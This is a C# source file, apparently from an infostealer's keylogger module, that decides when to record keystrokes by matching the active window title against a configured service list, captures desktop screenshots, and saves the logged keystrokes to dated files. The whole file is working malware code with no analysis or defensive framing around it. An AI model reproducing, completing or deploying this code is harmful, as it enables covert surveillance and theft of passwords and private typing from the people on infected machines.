using System;
using System.IO;
using RFStub;
using Stealer;

namespace Keylogger;

internal sealed class EventManager
{
	private static string KeyloggerDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\keylogger\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void Action()
	{
		if (Detect())
		{
			Keylogger.KeyLogs = Keylogger.KeyLogs + "\n\n### " + WindowManager.ActiveWindow + " ### (" + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
			DesktopScreenshot.Make(KeyloggerDirectory);
			Keylogger.KeyloggerEnabled = true;
		}
		else
		{
			SendKeyLogs();
			Keylogger.KeyloggerEnabled = false;
		}
	}

	private static bool Detect()
	{
		string[] keyloggerServices = Config.KeyloggerServices;
		int num = 0;
		while (true)
		{
			if (num < keyloggerServices.Length)
			{
				string value = keyloggerServices[num];
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void SendKeyLogs()
	{
		if (Keylogger.KeyLogs.Length >= 45 && !string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
		{
			string path = KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
			if (!Directory.Exists(KeyloggerDirectory))
			{
				Directory.CreateDirectory(KeyloggerDirectory);
			}
			File.WriteAllText(path, Keylogger.KeyLogs);
			Keylogger.KeyLogs = "";
		}
	}
}
